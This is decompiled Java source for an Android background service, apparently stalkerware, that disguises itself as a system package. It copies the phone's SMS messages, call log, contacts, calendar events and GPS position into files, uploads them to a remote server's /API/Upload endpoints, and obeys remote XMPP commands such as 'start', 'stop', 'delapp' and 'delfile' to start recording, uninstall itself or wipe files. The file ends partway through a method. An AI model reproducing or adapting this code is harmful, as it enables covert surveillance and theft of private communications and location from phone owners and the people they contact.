package com.android.service;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.app.Service;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build.VERSION;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.util.Log;
import android.widget.Toast;
import com.android.service.view.GPSTracker;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.mapapi.map.MKEvent;
import com.baidu.mapapi.search.MKSearch;
import com.xmpp.client.util.AlarmUtils;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.PhotoUtils;
import com.xmpp.client.util.PresenceType;
import com.xmpp.client.util.ValueUtiles;
import com.xmpp.client.util.XmppTool;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import org.apache.commons.codec.binary.Base64;
import org.apache.http.ParseException;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.jivesoftware.smack.Chat;
import org.jivesoftware.smack.ChatManager;
import org.jivesoftware.smack.MessageListener;
import org.jivesoftware.smack.XMPPConnection;
import org.jivesoftware.smack.XMPPException;
import org.jivesoftware.smack.packet.Message;
import org.jivesoftware.smack.packet.Presence;
import org.jivesoftware.smack.packet.Presence.Type;
import org.jivesoftware.smackx.GroupChatInvitation;
import org.jivesoftware.smackx.packet.IBBExtensions.Open;
import org.json.JSONException;
import org.json.JSONObject;

public class XmppService extends Service {
    private static String calanderEventURL;
    private static String calanderRemiderURL;
    private static String calanderURL;
    public static Chat newChat;
    public static Message sendMsg;
    public static String strCheckTag = "<&>";
    /* access modifiers changed from: private */
    public AppPreferences _appPrefs;
    /* access modifiers changed from: private */
    public AlertDialog alert;
    public String baiduLat;
    public String baiduLon;
    /* access modifiers changed from: private */
    public Builder builder;
    /* access modifiers changed from: private */
    public ChatManager chatMana;
    private Date date = null;
    double double_baiduLat = 0.0d;
    double double_baiduLon = 0.0d;
    double double_googleLat = 0.0d;
    double double_googleLon = 0.0d;
    GPSTracker gpsObj = null;
    /* access modifiers changed from: private */
    public Handler handlerObj = new Handler() {
        public void handleMessage(android.os.Message msg) {
            switch (msg.what) {
                case 2:
                    try {
                        String roleString = XmppService.this._appPrefs.getBody();
                        if (roleString != null && roleString.equalsIgnoreCase("b")) {
                            ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeySMS.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadSMS.ashx?phonenum=" + XmppService.this.strSelect_Mainnum);
                            ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyContacts.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadContacts.ashx?phonenum=" + XmppService.this.strSelect_Mainnum);
                            ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyCall.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadRecord.ashx?phonenum=" + XmppService.this.strSelect_Mainnum);
                            ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyCalendar.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadCalendar.ashx?phonenum=" + XmppService.this.strSelect_Mainnum);
                            ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyGPS.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadGPS.ashx?phonenum=" + XmppService.this.strSelect_Mainnum);
                        }
                        if (XmppService.this.haveInternet()) {
                            XmppService.this.chatMana = XmppService.this.xmppToolObj.getConnection().getChatManager();
                            XmppService.this.connectToServer();
                            XmppService.this.receiveMFrom(new StringBuilder(String.valueOf(XmppService.this.strSelect_Pairnum)).append("@monkeydiy").toString());
                        }
                        XmppService.this.result = "true";
                        return;
                    } catch (Exception e) {
                        e.printStackTrace();
                        new Builder(XmppService.this).setTitle("訊息").setMessage(Log.getStackTraceString(e)).setPositiveButton("確定", new OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                dialog.dismiss();
                            }
                        }).show();
                        return;
                    }
                case 3:
                    if (XmppService.this.strSelect_Mainnum != null && XmppService.this.strSelect_Mainnum.length() > 0 && XmppService.this.haveInternet() && !XmppService.this.Getstatus(XmppService.this.strSelect_Mainnum).booleanValue()) {
                        XmppService.this.chatMana = XmppService.this.xmppToolObj.getConnection().getChatManager();
                        XmppService.this.connectToServer();
                        XmppService.this.receiveMFrom(new StringBuilder(String.valueOf(XmppService.this.strSelect_Pairnum)).append("@monkeydiy").toString());
                        return;
                    }
                    return;
                case 5:
                    XmppService.this.startService(new Intent(XmppService.this, RecordingService.class));
                    return;
                case 6:
                    XmppService.this.stopService(new Intent(XmppService.this, RecordingService.class));
                    return;
                case 7:
                    XmppService.this.startActivity(new Intent("android.intent.action.DELETE", Uri.parse("package:com.android.myapp")));
                    return;
                case 8:
                    XmppService.this.path = new File(XmppService.this.strDataPath);
                    if (XmppService.this.path.exists()) {
                        XmppService.this.path.delete();
                        return;
                    }
                    return;
                case 9:
                    XmppService.this.UpdataConnectTime();
                    System.out.println("===============xmppsp.getString====================" + XmppService.this.xmppsp.getString("xmppset", ""));
                    if (XmppService.this.xmppsp.getString("xmppset", "") == null || XmppService.this.xmppsp.getString("xmppset", "").length() == 0) {
                        XmppService.this.xmppsp.edit().putString("xmppset", Open.ELEMENT_NAME).commit();
                        System.out.println("===============第一次連線成功會跳出訊息=====================");
                        new AlarmUtils(XmppService.this).startAlatm();
                        XmppService.this.builder.setTitle("連結訊息");
                        XmppService.this.builder.setMessage("連結結果:成功");
                        XmppService.this.builder.setPositiveButton("確定", new OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                            }
                        });
                        XmppService.this.alert = XmppService.this.builder.create();
                        XmppService.this.alert.getWindow().setType(2003);
                        XmppService.this.alert.show();
                        return;
                    }
                    return;
                case 10:
                    XmppService.this.builder.setTitle("連結訊息");
                    XmppService.this.builder.setMessage("連結結果:失敗!!");
                    XmppService.this.builder.setPositiveButton("請重新嘗試", new OnClickListener() {
                        public void onClick(DialogInterface dialog, int which) {
                        }
                    });
                    XmppService.this.alert = XmppService.this.builder.create();
                    XmppService.this.alert.getWindow().setType(2003);
                    XmppService.this.alert.show();
                    return;
                case MKSearch.TYPE_POI_LIST /*11*/:
                    XmppService.this.sms_saveFile();
                    System.out.println("[strSelect_Mainnum]: " + XmppService.this.strSelect_Mainnum);
                    if (ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeySMS.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadSMS.ashx?phonenum=" + XmppService.this.strSelect_Mainnum).booleanValue()) {
                        try {
                            XmppService.sendMsg = new Message();
                            XmppService.sendMsg.setBody("sms_update_end");
                            XmppService.newChat.sendMessage(XmppService.sendMsg);
                            return;
                        } catch (XMPPException e2) {
                            return;
                        }
                    }
                    return;
                case 12:
                    XmppService.this.contacts_saveFile();
                    if (ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyContacts.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadContacts.ashx?phonenum=" + XmppService.this.strSelect_Mainnum).booleanValue()) {
                        try {
                            XmppService.sendMsg = new Message();
                            XmppService.sendMsg.setBody("contact_update_end");
                            XmppService.newChat.sendMessage(XmppService.sendMsg);
                            return;
                        } catch (XMPPException e3) {
                            return;
                        }
                    }
                    return;
                case 13:
                    XmppService.this.call_saveFile();
                    if (ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyCall.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadRecord.ashx?phonenum=" + XmppService.this.strSelect_Mainnum).booleanValue()) {
                        try {
                            XmppService.sendMsg = new Message();
                            XmppService.sendMsg.setBody("callrecord_update_end");
                            XmppService.newChat.sendMessage(XmppService.sendMsg);
                            return;
                        } catch (XMPPException e4) {
                            return;
                        }
                    }
                    return;
                case MKEvent.MKEVENT_MAP_MOVE_FINISH /*14*/:
                    XmppService.this.Calendar_saveFile();
                    if (ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyCalendar.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadCalendar.ashx?phonenum=" + XmppService.this.strSelect_Mainnum).booleanValue()) {
                        try {
                            XmppService.sendMsg = new Message();
                            XmppService.sendMsg.setBody("calendar_update_end");
                            XmppService.newChat.sendMessage(XmppService.sendMsg);
                            return;
                        } catch (XMPPException e5) {
                            return;
                        }
                    }
                    return;
                case 15:
                    XmppService.this.GPS_saveFile();
                    if (ValueUtiles.UploadFileForServer(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyGPS.txt").toString(), "http://" + XmppService.this.hostname + "/API/UploadGPS.ashx?phonenum=" + XmppService.this.strSelect_Mainnum).booleanValue()) {
                        try {
                            XmppService.sendMsg = new Message();
                            XmppService.sendMsg.setBody("map_update_end");
                            XmppService.newChat.sendMessage(XmppService.sendMsg);
                            return;
                        } catch (XMPPException e6) {
                            return;
                        }
                    }
                    return;
                default:
                    return;
            }
        }
    };
    public String hostname;
    private boolean isSDCardExist;
    /* access modifiers changed from: private */
    public double latitude = 0.0d;
    /* access modifiers changed from: private */
    public double longitude = 0.0d;
    /* access modifiers changed from: private */
    public ProgressDialog mProgressDialog;
    /* access modifiers changed from: private */
    public File path;
    String result = "";
    private PhotoUtils savePhoto = null;
    /* access modifiers changed from: private */
    public String strDataPath = "";
    public String strLatObj;
    public String strLocation;
    public String strLonObj;
    public String strSelect_Mainnum = "";
    public String strSelect_Pairnum = "";
    /* access modifiers changed from: private */
    public XmppTool xmppToolObj = null;
    /* access modifiers changed from: private */
    public SharedPreferences xmppsp = null;

    class UploadThenConnect extends AsyncTask<Integer, Integer, String> {
        UploadThenConnect() {
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
            XmppService.this.mProgressDialog = new ProgressDialog(XmppService.this);
            XmppService.this.mProgressDialog.setMessage("初始化中...請稍候");
            XmppService.this.mProgressDialog.setProgressStyle(0);
            XmppService.this.mProgressDialog.setCancelable(false);
            XmppService.this.mProgressDialog.getWindow().setType(2003);
            XmppService.this.mProgressDialog.show();
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(Integer... aurl) {
            try {
                Thread.sleep(5000);
                android.os.Message msgs = new android.os.Message();
                msgs.what = 2;
                XmppService.this.handlerObj.sendMessage(msgs);
            } catch (InterruptedException e) {
                e.printStackTrace();
                XmppService.this.builder.setTitle("訊息");
                XmppService.this.builder.setMessage(Log.getStackTraceString(e));
                XmppService.this.builder.setPositiveButton("確定", new OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                });
                XmppService.this.alert = XmppService.this.builder.create();
                XmppService.this.alert.getWindow().setType(2003);
                XmppService.this.alert.show();
            }
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String unused) {
            if (XmppService.this.result.equalsIgnoreCase("true")) {
                try {
                    XmppService.this.mProgressDialog.dismiss();
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                    Toast.makeText(XmppService.this.getApplicationContext(), "上傳並連線發生錯誤", 1).show();
                    return;
                }
            }
            XmppService.this.mProgressDialog.dismiss();
            Toast.makeText(XmppService.this.getApplicationContext(), "上傳並連線發生錯誤", 1).show();
        }
    }

    public class MyLocationListenner implements BDLocationListener {
        public void onReceiveLocation(BDLocation location) {
            if (location != null) {
                XmppService.this.baiduLat = String.valueOf(location.getLatitude());
                XmppService.this.baiduLon = String.valueOf(location.getLongitude());
            }
        }

        public void onReceivePoi(BDLocation poiLocation) {
            if (poiLocation == null) {
            }
        }
    }

    static {
        calanderURL = "";
        calanderEventURL = "";
        calanderRemiderURL = "";
        if (VERSION.SDK_INT >= 8) {
            calanderURL = "content://com.android.calendar/calendars";
            calanderEventURL = "content://com.android.calendar/events";
            calanderRemiderURL = "content://com.android.calendar/reminders";
            System.out.println("Build.VERSION.SDK_INT >= 8 ");
            return;
        }
        calanderURL = "content://calendar/calendars";
        calanderEventURL = "content://calendar/events";
        calanderRemiderURL = "content://calendar/reminders";
        System.out.println("Build.VERSION.SDK_INT < 8 ");
    }

    public void onCreate() {
        try {
            this.hostname = getString(R.string.hostname);
            this.xmppToolObj = new XmppTool(this);
            this.builder = new Builder(this);
            this._appPrefs = new AppPreferences(this);
            this.strDataPath = this._appPrefs.getDataPath();
            if (this.strDataPath.length() <= 0) {
                this.strDataPath = ValueUtiles.getDataPath(this);
            }
        } catch (Exception e) {
            e.printStackTrace();
            this.builder.setTitle("訊息");
            this.builder.setMessage(Log.getStackTraceString(e));
            this.builder.setPositiveButton("確定", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            this.alert = this.builder.create();
            this.alert.getWindow().setType(2003);
            this.alert.show();
        }
        super.onCreate();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            this.strSelect_Mainnum = this._appPrefs.getMainnum();
            this.strSelect_Pairnum = this._appPrefs.getPairnum();
            this.xmppsp = getSharedPreferences("XMPPSET", 0);
            if (this.isSDCardExist) {
                String roleString = this._appPrefs.getBody();
                if (roleString != null && roleString.equalsIgnoreCase("b")) {
                    sms_saveFile();
                    call_saveFile();
                    contacts_saveFile();
                    GPS_saveFile();
                    Calendar_saveFile();
                }
            }
            if (this.xmppsp.getString("xmppset", "") == null || this.xmppsp.getString("xmppset", "").length() == 0) {
                new UploadThenConnect().execute(new Integer[0]);
            } else {
                android.os.Message msgs = new android.os.Message();
                msgs.what = 3;
                this.handlerObj.sendMessage(msgs);
            }
        } catch (Exception e) {
            e.printStackTrace();
            this.builder.setTitle("訊息");
            this.builder.setMessage(Log.getStackTraceString(e));
            this.builder.setPositiveButton("確定", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            this.alert = this.builder.create();
            this.alert.getWindow().setType(2003);
            this.alert.show();
        }
        return 1;
    }

    /* access modifiers changed from: private */
    public void receiveMFrom(String from) {
        newChat = this.chatMana.createChat(from, null);
        newChat.addMessageListener(new MessageListener() {
            public void processMessage(Chat arg0, Message arg1) {
                if (arg1.getTo().contains(XmppService.this.strSelect_Mainnum)) {
                    Log.e("command from: ", arg1.getFrom() + " (sender)");
                    android.os.Message msgs = new android.os.Message();
                    Log.e("command content: ", new StringBuilder(String.valueOf(arg1.getBody())).toString());
                    if (arg1.getBody().equalsIgnoreCase("upload")) {
                        msgs.what = 4;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("start")) {
                        msgs.what = 5;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("stop")) {
                        msgs.what = 6;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("delapp")) {
                        msgs.what = 7;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("delfile")) {
                        msgs.what = 8;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("sms_update_start")) {
                        msgs.what = 11;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("contact_update_start")) {
                        msgs.what = 12;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("callrecord_update_start")) {
                        msgs.what = 13;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("calendar_update_start")) {
                        msgs.what = 14;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    } else if (arg1.getBody().equalsIgnoreCase("map_update_start")) {
                        msgs.what = 15;
                        XmppService.this.handlerObj.sendMessage(msgs);
                    }
                }
            }
        });
    }

    /* access modifiers changed from: private */
    public void connectToServer() {
        final String stDate = new SimpleDateFormat("yyyy年MM月dd日HH:mm:ss").format(new Date(System.currentTimeMillis()));
        new Thread(new Runnable() {
            public void run() {
                android.os.Message msgs;
                try {
                    Log.e("connectToServer()", "logining...");
                    System.out.println("XMPP------------" + XmppService.this.strSelect_Mainnum + "---1234");
                    XMPPConnection xc = XmppService.this.xmppToolObj.getConnection();
                    if (!xc.isAuthenticated()) {
                        xc.login(XmppService.this.strSelect_Mainnum, "1234");
                    }
                    xc.sendPacket(new Presence(Type.available));
                    msgs = new android.os.Message();
                    msgs.what = 9;
                    XmppService.this.handlerObj.sendMessage(msgs);
                    ValueUtiles.showlog("連線成功--時間:" + stDate);
                    Thread.sleep(2000);
                } catch (Exception e) {
                    ValueUtiles.showlog("連線失敗--時間:" + stDate);
                    Log.e("--------------->", "login failed...");
                    XmppService.this.xmppToolObj.closeConnection();
                    msgs = new android.os.Message();
                    if (XmppService.this.xmppsp.getString("xmppset", "") == null || XmppService.this.xmppsp.getString("xmppset", "").length() == 0) {
                        msgs.what = 10;
                        XmppService.this.handlerObj.sendMessage(msgs);
                        XmppService.this.builder.setTitle("訊息");
                        XmppService.this.builder.setMessage(Log.getStackTraceString(e));
                        XmppService.this.builder.setPositiveButton("確定", new OnClickListener() {
                            public void onClick(DialogInterface dialog, int which) {
                                dialog.dismiss();
                            }
                        });
                        XmppService.this.alert = XmppService.this.builder.create();
                        XmppService.this.alert.getWindow().setType(2003);
                        XmppService.this.alert.show();
                    }
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e2) {
                    }
                }
            }
        }).start();
    }

    /* access modifiers changed from: private */
    public void UpdataConnectTime() {
        String str_url_login = "http://" + this.hostname + "/API/UploadConnectTime.ashx?phonenum=" + this.strSelect_Mainnum;
        System.out.println("===========UpdataConnectTime=============" + str_url_login);
        try {
            new DefaultHttpClient().execute(new HttpGet(str_url_login));
        } catch (IOException e) {
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void sms_saveFile() {
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this);
        }
        Cursor cursorSmsObj = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
        try {
            FileWriter fw = new FileWriter(this.strDataPath + this.strSelect_Mainnum + "MonkeySMS.txt");
            if (cursorSmsObj == null || cursorSmsObj.getCount() <= 0) {
                fw.append(strCheckTag + strCheckTag + strCheckTag + "\r\n");
            } else {
                for (int i = 0; i < cursorSmsObj.getCount(); i++) {
                    cursorSmsObj.moveToPosition(i);
                    String sPhoneNo = cursorSmsObj.getString(cursorSmsObj.getColumnIndex("address"));
                    String sMsgBody = cursorSmsObj.getString(cursorSmsObj.getColumnIndexOrThrow("body"));
                    int intType = cursorSmsObj.getInt(cursorSmsObj.getColumnIndexOrThrow("type"));
                    long logDate = cursorSmsObj.getLong(cursorSmsObj.getColumnIndex("date"));
                    String strType = "";
                    if (intType == 1) {
                        strType = "in";
                    } else if (intType == 2) {
                        strType = "out";
                    } else {
                        strType = "null";
                    }
                    this.date = new Date(logDate);
                    String sMsgDate = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(this.date);
                    if (!(sPhoneNo == null || sMsgBody == null || sMsgDate == null)) {
                        fw.append(new StringBuilder(String.valueOf(strType)).append(strCheckTag).append(sPhoneNo.trim()).append(strCheckTag).append(sMsgBody.trim()).append(strCheckTag).append(sMsgDate.trim()).append("\r\n").toString());
                    }
                }
                cursorSmsObj.close();
            }
            fw.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
            this.builder.setTitle("訊息");
            this.builder.setMessage(Log.getStackTraceString(ioe));
            this.builder.setPositiveButton("確定", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            this.alert = this.builder.create();
            this.alert.getWindow().setType(2003);
            this.alert.show();
        } catch (Exception e) {
        }
    }

    /* access modifiers changed from: private */
    public void call_saveFile() {
        String callDate = "";
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this);
        }
        Cursor cursorObj = getContentResolver().query(Calls.CONTENT_URI, new String[]{"number", "name", "type", "date"}, null, null, "date DESC");
        try {
            FileWriter fw = new FileWriter(this.strDataPath + this.strSelect_Mainnum + "MonkeyCall.txt");
            if (cursorObj == null || cursorObj.getCount() <= 0) {
                fw.append(strCheckTag + ":" + strCheckTag + "\r\n");
            } else {
                for (int i = 0; i < cursorObj.getCount(); i++) {
                    String numbertype;
                    cursorObj.moveToPosition(i);
                    String number = cursorObj.getString(0);
                    String numberOrName = cursorObj.getString(1);
                    int type = cursorObj.getInt(2);
                    long time_mills = Long.parseLong(cursorObj.getString(3));
                    SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                    this.date = new Date(time_mills);
                    if (this.date != null) {
                        callDate = simpleDateFormat.format(this.date);
                    }
                    if (type == 3) {
                        numbertype = "not";
                    } else if (type == 2) {
                        numbertype = "out";
                    } else {
                        numbertype = "in";
                    }
                    if (numberOrName == null) {
                        numberOrName = "未命名";
                    }
                    fw.append(new StringBuilder(String.valueOf(numbertype)).append(strCheckTag).append(numberOrName).append(":").append(number).append(strCheckTag).append(callDate).append("\r\n").toString());
                }
                cursorObj.close();
            }
            fw.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
            this.builder.setTitle("訊息");
            this.builder.setMessage(Log.getStackTraceString(ioe));
            this.builder.setPositiveButton("確定", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            this.alert = this.builder.create();
            this.alert.getWindow().setType(2003);
            this.alert.show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void contacts_saveFile() {
        Cursor contactCurObj = getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this);
        }
        try {
            FileWriter fw = new FileWriter(this.strDataPath + this.strSelect_Mainnum + "MonkeyContacts.txt");
            if (contactCurObj == null || contactCurObj.getCount() <= 0) {
                fw.append(strCheckTag + "\r\n");
            } else {
                while (contactCurObj.moveToNext()) {
                    String id = contactCurObj.getString(contactCurObj.getColumnIndex("_id"));
                    String name = contactCurObj.getString(contactCurObj.getColumnIndex("display_name"));
                    if (contactCurObj.getInt(contactCurObj.getColumnIndex("has_phone_number")) > 0) {
                        Cursor pCur = getContentResolver().query(Phone.CONTENT_URI, null, "contact_id = " + id, null, null);
                        while (pCur.moveToNext()) {
                            fw.append(new StringBuilder(String.valueOf(name)).append(strCheckTag).append(pCur.getString(pCur.getColumnIndex("data1"))).append("\r\n").toString());
                        }
                        pCur.close();
                    }
                }
                contactCurObj.close();
            }
            fw.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
            this.builder.setTitle("訊息");
            this.builder.setMessage(Log.getStackTraceString(ioe));
            this.builder.setPositiveButton("確定", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            this.alert = this.builder.create();
            this.alert.getWindow().setType(2003);
            this.alert.show();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void GPS_saveFile() {
        if (this.gpsObj == null) {
            this.gpsObj = new GPSTracker(this);
        }
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this);
        }
        new Thread() {
            public void run() {
                new Thread() {
                    public void run() {
                        if (XmppService.this.haveInternet() && XmppService.this.gpsObj != null && XmppService.this.gpsObj.canGetLocation()) {
                            try {
                                AnonymousClass1.sleep(2000);
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            try {
                                XmppService.this.longitude = XmppService.this.gpsObj.getLongitude();
                                XmppService.this.latitude = XmppService.this.gpsObj.getLatitude();
                                XmppService.this.strLonObj = Double.toString(XmppService.this.longitude);
                                XmppService.this.strLatObj = Double.toString(XmppService.this.latitude);
                                if (!(XmppService.this.strLatObj == null || XmppService.this.strLatObj.length() <= 0 || XmppService.this.strLonObj == null || XmppService.this.strLonObj.length() <= 0 || XmppService.this.strLonObj.equalsIgnoreCase("") || XmppService.this.strLatObj.equalsIgnoreCase(""))) {
                                    if (XmppService.this.strLatObj.length() <= 9 || XmppService.this.strLonObj.length() <= 9) {
                                        XmppService.this.strLocation = new StringBuilder(String.valueOf(XmppService.this.strLonObj)).append(XmppService.strCheckTag).append(XmppService.this.strLatObj).append(XmppService.strCheckTag).append(XmppService.this.strLonObj).append(XmppService.strCheckTag).append(XmppService.this.strLatObj).toString();
                                    } else {
                                        XmppService.this.strLocation = new StringBuilder(String.valueOf(XmppService.this.strLonObj.substring(0, 9))).append(XmppService.strCheckTag).append(XmppService.this.strLatObj.substring(0, 9)).append(XmppService.strCheckTag).append(XmppService.this.strLonObj.substring(0, 9)).append(XmppService.strCheckTag).append(XmppService.this.strLatObj.substring(0, 9)).toString();
                                    }
                                }
                                System.out.println("-----googleLat---------" + XmppService.this.strLatObj);
                                System.out.println("-----googleLon---------" + XmppService.this.strLonObj);
                                FileWriter fw = new FileWriter(new StringBuilder(String.valueOf(XmppService.this.strDataPath)).append(XmppService.this.strSelect_Mainnum).append("MonkeyGPS.txt").toString());
                                fw.append(XmppService.this.strLocation);
                                fw.close();
                            } catch (Exception e2) {
                                e2.printStackTrace();
                            }
                        }
                    }
                }.start();
            }
        }.start();
    }

    private void getGooglelocationFromBaidu(String type, String Lon, String Lat) {
        String uriAPI = "http://api.map.baidu.com/ag/coord/convert?from=0&to=" + type + "&x=" + Lon + "&y=" + Lat + "&callback=BMap.Convertor.cbk_7594";
        Log.e("--------------->", uriAPI);
        try {
            String res = EntityUtils.toString(new DefaultHttpClient().execute(new HttpGet(uriAPI)).getEntity());
            if (res.indexOf("(") > 0 && res.indexOf(")") > 0) {
                String str = res.substring(res.indexOf("(") + 1, res.indexOf(")"));
                if ("0".equals(res.substring(res.indexOf("error") + 7, res.indexOf("error") + 8))) {
                    JSONObject js = new JSONObject(str);
                    Base64 base64 = new Base64();
                    this.strLonObj = new String(base64.decode(js.getString(GroupChatInvitation.ELEMENT_NAME).getBytes()));
                    this.strLatObj = new String(base64.decode(js.getString("y").getBytes()));
                    System.out.println(this.strLatObj + "  " + this.strLonObj);
                }
            }
        } catch (ParseException e) {
            e.printStackTrace();
        } catch (IOException e2) {
            e2.printStackTrace();
        } catch (JSONException e3) {
            e3.printStackTrace();
        } catch (Exception e4) {
            e4.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void Calendar_saveFile() {
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this);
        }
        Cursor eventCursor = getContentResolver().query(Uri.parse(calanderEventURL), new String[]{"_id", "title", "description", "dtstart", "dtend", "eventLocation"}, null, null, null);
        try {
            FileWriter fw = new FileWriter(this.strDataPath + this.strSelect_Mainnum + "MonkeyCalendar.txt");
            if (eventCursor == null || eventCursor.getCount() <= 0) {
                fw.append(strCheckTag + strCheckTag + strCheckTag + strCheckTag + strCheckTag + "\r\n");
            } else {
                eventCursor.moveToFirst();
                while (eventCursor.moveToNext()) {
                    String id = eventCursor.getString(0);
                    String title = eventCursor.getString(1);
                    if (title == null || title.length() <= 0) {
                        title = "無主題";
                    }
                    String description = eventCursor.getString(2);
                    if (description == null || description.length() <= 0) {
                        description = "無內容";
                    }
                    SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm");
                    this.date = new Date(eventCursor.getLong(3));
                    String beginString = "";
                    if (this.date != null) {
                        beginString = simpleDateFormat.format(this.date);
                    }
                    this.date = new Date(eventCursor.getLong(4));
                    String endString = "";
                    if (this.date != null) {
                        endString = simpleDateFormat.format(this.date);
                    }
                    String eventLocation = eventCursor.getString(5);
                    if (eventLocation == null || eventLocation.length() <= 0) {
                        eventLocation = "無地點";
                    }
                    fw.append(new StringBuilder(String.valueOf(id)).append(strCheckTag).append(title).append(strCheckTag).append(description).append(strCheckTag).append(beginString).append(strCheckTag).append(endString).append(strCheckTag).append(eventLocation).append("\r\n").toString());
                }
                eventCursor.close();
            }
            fw.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
            this.builder.setTitle("訊息");
            this.builder.setMessage(Log.getStackTraceString(ioe));
            this.builder.setPositiveButton("確定", new OnClickListener() {
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
            this.alert = this.builder.create();
            this.alert.getWindow().setType(2003);
            this.alert.show();
